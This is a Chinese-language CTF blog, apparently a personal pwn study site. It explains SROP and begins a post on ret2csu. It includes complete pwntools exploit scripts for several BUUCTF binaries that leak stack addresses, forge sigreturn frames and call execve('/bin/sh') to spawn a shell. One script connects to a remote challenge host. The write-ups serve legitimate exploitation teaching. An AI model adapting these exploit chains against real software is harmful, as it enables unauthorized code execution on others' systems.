<p>现在其实最大的问题是怎么去泄露栈的地址？我们可以第一次read读入一个字符，去让系统调用号变成1，但是这就意味着我们无法控制返回地址。这里用了已经很巧妙的方法，由于每一次输入都是从栈顶开始存入数据，如果我们第一次<strong>连续输入了两个start的首地址</strong>（但事实上这里是要输入三个start的地址，不过现在我们先不讨论第三个start的作用），然后<strong>执行了ret，此时第一个start的地址就被pop出来了，也就是说现在栈顶只有一个start地址了，同时我们现在又到了系统调用read这里，然后我们只写一个字节\xB3,这样start的地址0x4000B0就被修改成了0x4000B3，</strong>这样使得我们的RAX里面现在的值就是1了，同时下一次返回的时候跳过了第一个指令xor rax,rax，直接从mov edx,0x400指令开始，最终实现系统调用write，从而实现栈地址泄露。（可以看见下图的左侧栈顶是0x4000b0而执行了read之后，右侧的栈顶已经是0x4000b3了）</p>
<p><img src="/../img/2706180-20220220190308888-853157541.png"></p>
<p>不过紧接着遇见的问题就是会发现由于只有一个函数的原因，栈底直接就是环境变量了，因此泄露出来的全都是环境变量（如下图）。</p>
<p><img src="/../img/2706180-20220220190316234-993019298.png"><br>而环境变量中没有任何一个内存单元指向栈地址，因此我们没法用具体的偏移直接计算，不过好消息是，**由于栈地址随机化的地址变化并不是太大，因此我们可以选取一片空的栈区去存放我们的参数和signal frame（通过泄露的地址直接减去一个较大的数据来指向这片栈区)**。</p>
<p>最后的难点就是我们的system call chains的构建，<strong>由于我们肯定是用一次sigreturn然后控制参数去调用read（因为我们要把参数写入指定的地址），但是由于我们没办法直接系统调用 sigreturn，需要间接的用read函数来控制RAX在系统调用才行，并且还需要一次sigreturn去控制参数调用execve</strong>。</p>
<p>这里也是用了一个非常巧妙的手法，由于要控制RAX为15，这就意味着我们只能输入15个字节的内容，可是我们还需要去构造signal frame，因此我们分两次完成，第一次输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br></pre></td></tr></table></figure>

<p>这个start可以让我们再输入一次，而此时把frame给构建到栈里面，这八个a则是负责去占一个位置（如下图）</p>
<p><img src="/../img/2706180-20220220190323742-16754978.png"></p>
<p>第二次输入，这样syscall就到了原本八个a占的位置，而七个b则是为了凑齐十五个字节（如下图）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220220190329950-517103708.png"></p>
<p>按照这两次payload就可以实现sigreturn调用了。</p>
<p>然后就没什么了，最后要注意一下，第二次执行sigreturn的第一个payload顺便把参数给发送过去，然后用我们在系统调用read的那个rsi配合偏移来获取&#x2F;bin&#x2F;sh的地址即可。</p>
<p>最后的exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x4000BE</span></span><br><span class="line">start_addr=<span class="number">0x4000B0</span></span><br><span class="line">payload=p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&#x27;\xB3&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0x400</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=target_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr+<span class="number">0x110</span> <span class="comment">#此时加上0x110才是/bin/sh的地址</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUCTF-ciscn-2019-es-7"><a href="#BUUCTF-ciscn-2019-es-7" class="headerlink" title="BUUCTF_ciscn_2019_es_7"></a>BUUCTF_ciscn_2019_es_7</h2><p>这里我以BUUCTF上的ciscn_2019_es_7来演示一下（这道题我最开始是用ret2csu做出来的，那个WP放到了ret2csu的那篇博客上，这篇博客写一下SROP这个方法）</p>
<p>其实SROP的思路很简单，并且pwntools中也提供了Sigreturn Frame类来简化我们代码的编写。</p>
<p><img src="/../img/2706180-20220220190338842-381275045.png"></p>
<p>这道题在主函数里只有两个系统调用，不过发现这个write系统调用时有漏洞的，它可以打印0x30个数据，可是可以看出来buf距离栈底仅仅只有0x10字节</p>
<p><img src="/../img/2706180-20220220190344777-904593431.png"></p>
<p>这就意味着write是可以去泄露栈中数据的，因此我们就可以配合系统调用read来把&#x2F;bin&#x2F;sh写入栈里面，同时里面偏移加上泄露的栈地址，我们就可以计算出&#x2F;bin&#x2F;sh的地址。（这个&#x2F;bin&#x2F;sh偏移的计算在ret2csu中已经提过了，这里就不在赘述）</p>
<p>然后我们还发现了系统调用sigreturn</p>
<p><img src="/../img/2706180-20220220190351016-2105082674.png"></p>
<p>这就意味着我们可以去实现SROP了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">mov_rax_15=<span class="number">0x4004DA</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)<span class="comment">#这次发送的目的就是获取/bin/sh的地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>)<span class="comment">#限制一下条件，确保接收的是我们要泄露的地址</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span><span class="comment">#这个偏移在ret2csu中计算出来了，这里不再重复提了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">frame=SigreturnFrame()<span class="comment">#接下来开始设置参数</span></span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=bin_sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(mov_rax_15)+p64(syscall_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#这次payload的目的是把/bin/sh存到栈里，并且伪造一个Signal Frame</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="BUUCTF-ciscn-2019-s-3"><a href="#BUUCTF-ciscn-2019-s-3" class="headerlink" title="BUUCTF_ciscn_2019_s_3"></a>BUUCTF_ciscn_2019_s_3</h2><p><img src="/../img/2706180-20220222104440708-175917302.png"></p>
<p><img src="/../img/2706180-20220222104446654-1916710342.png"></p>
<p>这已经很明显了，要用SROP。</p>
<p>先去把栈地址泄露一下。</p>
<p>第一次随便输入（不过最后要在返回地址上写一个vul的首地址，重新进行read）</p>
<p>第一次走vul就是为了write泄露地址</p>
<p><img src="/../img/2706180-20220222104450476-1019432047.png"></p>
<p>我们要泄露距离栈顶第三个的内容，因为它指向了栈地址</p>
<p><img src="/../img/2706180-20220222104454166-166128671.png"></p>
<p>然后发现这个地址是在32字节处被接收的</p>
<p>经过观察read函数，发现我们payload从0x7fffffffdf70开始存储，看一下泄露的栈地址距离这个df70的偏移</p>
<p><img src="/../img/2706180-20220222104457644-721340483.png"></p>
<p>偏移拿到，然后就直接构造srop的那个payload即可，我们要保证&#x2F;bin&#x2F;sh在df70这个地址，然后经过调试发现这里是要填充16个字节才能到返回地址的，因此我就填了两个&#x2F;bin&#x2F;sh\x00，第二次填充别的也行，反正要凑齐十六个字节</p>
<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=kong</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(modify_rax)+p64(syscall_ret_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这道题其实收获最大的并不是这个正确的exp</p>
<p>而是下面这个错误的exp(这个exp脚本直接运行的话，是拿不到shell的，但是如果用gdb附加进程调试的话，是可以拿到shell的，因此这个exp是非常奇怪的，但它确实是错的，只不过因为巧合在调试的情况下，是正确的)</p>
<p>可以发现这个exp发送了三次payload</p>
<p>第三次和第二次payload就是在布置准备执行srop的条件</p>
<p>当时用gdb调试走到最后发现就可以获取shell</p>
<p>但是如果直接运行这个脚本就不能获取shell</p>
<p>卡了很久很久，最后请教了roderick师傅，最后豁然开朗，解释如下。</p>
<p><strong>在挂gdb的时候 第二次的read还没有执行，但是内核缓冲区的数据已经拷贝到了用户数据 意思就是说 我的第二次payload和第三次的payload现在都存到了缓冲区里面 gdb调试到了第二个read，直接就把两次的payload 都给读进去了（我又看了下调试发现却是是这样） 然后这两次的内容在一次里面修改了栈空间恰好就是对的了 但是我程序运行的时候，还是发了三次的payload</strong></p>
<hr>
<p> <strong>简单来说就是就是其实我现在用gdb看的是一种假象，gdb现在调试让我看到的 是一次性发送了两个payload的情况，但事实上我程序本身运行的时候 并不是我现在gdb看到的情况</strong>** </p>
<p> <font color=red><strong>以后这里就要注意了，如果是多个read的情况，使用gdb调试的时候要注意，避免一次read给读进去两次payload。</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(vul_addr)+p64(modify_rax)+p64(syscall_ret_addr)<span class="comment">#核心问题是在这里，此时的return直接返回到了modify_rax这个地址，没有到vul_addr这个地址，因此程序其实并没有执行第三次的输入。</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h2><p><img src="/../img/image-20221007110823863.png" alt="image-20221007110823863"></p>
<p>发现这里就一个输入和输出的系统调用，发现无论如何也无法泄露栈地址，因此&#x2F;bin&#x2F;sh直接写入栈里的话我们是不知道地址的。所以采用srop伪造两次上下文，第一次系统调用read将&#x2F;bin&#x2F;sh以及第二次伪造的上下文都写入data段(data段地址是固定不变的)，然后迁移到data段，进行第二次srop。</p>
<p>这道题控制第一次rip的gadget为syscall;leave;ret,而leave和ret指令相当于mov rbp,rsp;pop rbp;pop  rip，调试一下就发现我们控制rsp没用，要去控制rbp，在执行leave;ret的时候又将rbp给了rsp，因此第一次布置的寄存器的值中只需控制rbp即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29672</span>)</span><br><span class="line">syscall_addr=<span class="number">0x0000000000401033</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401032</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0x402000</span></span><br><span class="line">frame.rdx=<span class="number">0x1000</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">frame.rbp=<span class="number">0x402000</span>-<span class="number">8</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=<span class="number">0x402108</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007110808668.png" alt="image-20221007110808668"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/4202235.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/4202235.html" class="post-title-link" itemprop="url">关于ret2csu的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:44:15" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>关于这个ret2csu，与其说它是一种题型，倒不如说这是一种方法（用于控制寄存器）</p>
</blockquote>
<h2 id="什么是ret2csu？"><a href="#什么是ret2csu？" class="headerlink" title="什么是ret2csu？"></a>什么是ret2csu？</h2><p>这个其实就是在程序中一般都会有一段万能的控制参数的gadgets，里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的，因此只要是动态链接的程序就都会有这个函数（至少我还没有遇见过特殊情况）），<strong>从而达到控制参数的目的</strong>。</p>
<h2 id="下面是-libc-csu-init的汇编代码。"><a href="#下面是-libc-csu-init的汇编代码。" class="headerlink" title="下面是__libc_csu_init的汇编代码。"></a>下面是__libc_csu_init的汇编代码。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:0000000000400540                 public __libc_csu_init</span><br><span class="line">.text:0000000000400540 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:0000000000400540 ; __unwind &#123;</span><br><span class="line">.text:0000000000400540                 push    r15</span><br><span class="line">.text:0000000000400542                 push    r14</span><br><span class="line">.text:0000000000400544                 mov     r15d, edi</span><br><span class="line">.text:0000000000400547                 push    r13</span><br><span class="line">.text:0000000000400549                 push    r12</span><br><span class="line">.text:000000000040054B                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400552                 push    rbp</span><br><span class="line">.text:0000000000400553                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:000000000040055A                 push    rbx</span><br><span class="line">.text:000000000040055B                 mov     r14, rsi</span><br><span class="line">.text:000000000040055E                 mov     r13, rdx</span><br><span class="line">.text:0000000000400561                 sub     rbp, r12</span><br><span class="line">.text:0000000000400564                 sub     rsp, 8</span><br><span class="line">.text:0000000000400568                 sar     rbp, 3</span><br><span class="line">.text:000000000040056C                 call    _init_proc</span><br><span class="line">.text:0000000000400571                 test    rbp, rbp</span><br><span class="line">.text:0000000000400574                 jz      short loc_400596</span><br><span class="line">.text:0000000000400576                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400578                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400580</span><br><span class="line">.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400580                 mov     rdx, r13</span><br><span class="line">.text:0000000000400583                 mov     rsi, r14</span><br><span class="line">.text:0000000000400586                 mov     edi, r15d</span><br><span class="line">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040058D                 add     rbx, 1</span><br><span class="line">.text:0000000000400591                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594                 jnz     short loc_400580</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400596                 add     rsp, 8</span><br><span class="line">.text:000000000040059A                 pop     rbx</span><br><span class="line">.text:000000000040059B                 pop     rbp</span><br><span class="line">.text:000000000040059C                 pop     r12</span><br><span class="line">.text:000000000040059E                 pop     r13</span><br><span class="line">.text:00000000004005A0                 pop     r14</span><br><span class="line">.text:00000000004005A2                 pop     r15</span><br><span class="line">.text:00000000004005A4                 retn</span><br><span class="line">.text:00000000004005A4 ; &#125; // starts at 400540</span><br><span class="line">.text:00000000004005A4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
<h2 id="如何利用csu这部分代码？"><a href="#如何利用csu这部分代码？" class="headerlink" title="如何利用csu这部分代码？"></a>如何利用csu这部分代码？</h2><p><img src="/../img/2706180-20220218171725002-1163274691.png"></p>
<p>我们利用的其实就是这两部分的代码，我们给这两段起个名字，上面的部分叫gadget2，下面的部分叫gadget1（因为我们先执行下面的部分，因此就叫下面的gadget1吧）</p>
<p>假设我们现在通过溢出，已经可以控制程序的执行流了，我们此时就把返回地址填写成gadget1的地址0x40059A（因为我们并不需要add rsp,8这个指令，因此直接从0x40059A开始即可）</p>
<p>现在就会把栈中的前6个数据分别弹给rbx,rbp,r12,r13,r14,r15这六个寄存器。</p>
<p>我们通常会把rbx的值设置成0，而rbp设置成1.这样的目的是在执行call    qword ptr [r12+rbx*8]这个指令的时候，我们仅仅把r12的值给设置成指向我们想call地址的地址即可，从而不用管rbx。</p>
<p>又因为这三个指令add     rbx,；cmp     rbx, rbp；jnz     short loc_400580，jnz是不相等时跳转，我们通常并不想跳转到0x400580这个地方，因为此刻执行这三个指令的时候，我们就是从0x400580这个地址过来的。因此rbx加一之后，我们要让它和rbp相等，因此rbp就要提前被设置成1.</p>
<p>然后r12要存放的就是指向（我们要跳转到那个地址）的地址。这里有个很重要的小技巧，如果你不想使用这个call，或者说你想call一个函数，但是你拿不到它的got地址，因此没法使用这个call，那就去call一个空函数（_term_proc函数）（并且要注意的是，r12的地址填写的并不是_term_proc的地址，而是指向这个函数的地址）。</p>
<p>然后r13,r14,r15这三个值分别对应了rdx,rsi,edi。这里要注意的是，r15最后传给的是edi,最后rdi的高四字节都是00，而低四字节才是r15里的内容。（也就是说如果想用ret2csu去把rdi里存放成一个地址是不可行的）</p>
<p>接着到了gadget1的结尾ret这里，然后我们紧接着写入gadget2的地址0x400580。<br><img src="/../img/2706180-20220218171748437-1273885946.png"></p>
<p>此时开始执行这部分代码，这没什么好说的了，就是把r13,r14,r15的值放入rdx,rsi,edi三个寄存器里面。</p>
<p>然后由于我们前面的rbx是0，加一之后等于了rbp，因此jnz不跳转。那就继续向下执行，如果我们上面call了一个空函数的话，那我们就利用下面的ret。由于继续向下执行，因此又来到了gadget1这里。</p>
<p><img src="/../img/2706180-20220218171758126-1557535385.png"></p>
<p>如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（7*8你懂得）个垃圾数据即可。</p>
<p>如果我们还需要继续控制参数的话，那就此时不填充垃圾数据，继续去控制参数，总之不管干啥呢，这里都要凑齐56字节的数据，以便我们执行最后的ret，最后ret去执行我们想要执行的函数即可。</p>
<h3 id="错位获取pop-rsi-pop-rdi"><a href="#错位获取pop-rsi-pop-rdi" class="headerlink" title="错位获取pop rsi;pop rdi"></a>错位获取pop rsi;pop rdi</h3><p>如果只是要单纯控制pop rsi和pop rdi寄存器的话，可以不用ret2csu，直接搜的。因为pop r14和pop r15（这两个gadget存在于__libc_csu_init)对应的机器码分别为</p>
<p><img src="/../img/2706180-20220416083231234-1556484483.png"></p>
<p>（汇编如何看对应的机器码，我在shellcode那一篇博客中已经讲过了）可以发现pop rsi和pop rdi分别存在于pop r14和pop r15的机器码中，因此我们可以利用错位来得到他们。用Ropgadget直接搜pop rsi或是搜它的机器码5e，就会出来错位得到的地址。(方法如下)不过没有办法通过错位来得到pop rdx。</p>
<p><img src="/../img/2706180-20220416083243224-1368780037.png"></p>
<h2 id="ret2csu相关题目"><a href="#ret2csu相关题目" class="headerlink" title="ret2csu相关题目"></a>ret2csu相关题目</h2><p>下面是我做过三道关于ret2csu的题目，附上WP</p>
<h3 id="VNCTF2022公开赛clear-got"><a href="#VNCTF2022公开赛clear-got" class="headerlink" title="VNCTF2022公开赛clear_got"></a>VNCTF2022公开赛clear_got</h3><p>做这道题，必须先掌握下面这三个点。</p>
<p>1、首先是call指令后面的这个地址（如果是函数名就不说了），就比如现在ret2csu中，准备执行这个</p>
<p><img src="/../img/2706180-20220218171949096-1693789079.png"></p>
<p>我们让rbx为0，此时call r12，那怎么才能call成功呢，原本看到师傅们说是要装got地址，后来发现装一个地址（这个地址是被另一个地址所指向的），然后把r12填写成另一个地址，也可以call成功，再回想一下为什么要装got地址，而不是plt地址，原因也是出现在了got地址仅仅会跳转一次，也就是说填一个got地址，也是会从这个地址去跳到got地址所指向的地址（也就是真实地址（因为延迟绑定的原因，如果不清楚的话，这里请自行百度一下延迟绑定机制）），因此结论就出来了，要想去call去跳转到一个地址A，那就必须用一个指向地址A的地址B放到call后面。</p>
<p>2、如果我们仅仅是想利用ret2csu去控制参数，而并不想去用call执行，或者说是你想用call执行跳转，但是你找不到去指向你想跳转的那个地址，因此我们用最后的ret跳转（你想跳转到哪里，就填哪的地址即可）。那怎么把call的那一步忽略呢？我们可以call一个空函数（不需要参数，执行之后也不会对程序本身造成任何影响的函数），这个函数就是_term_proc（注意，这里call的是指向_term_proc的地址，而非term_proc的地址</p>
<p><img src="/../img/2706180-20220218171956921-899601017.png"></p>
<p>3、怎么去修改rax的值？</p>
<p>这里提到了一种很巧妙的方法。我们先来看一下read函数和write函数的返回值。</p>
<p><img src="/../img/2706180-20220218172005653-329466746.png"></p>
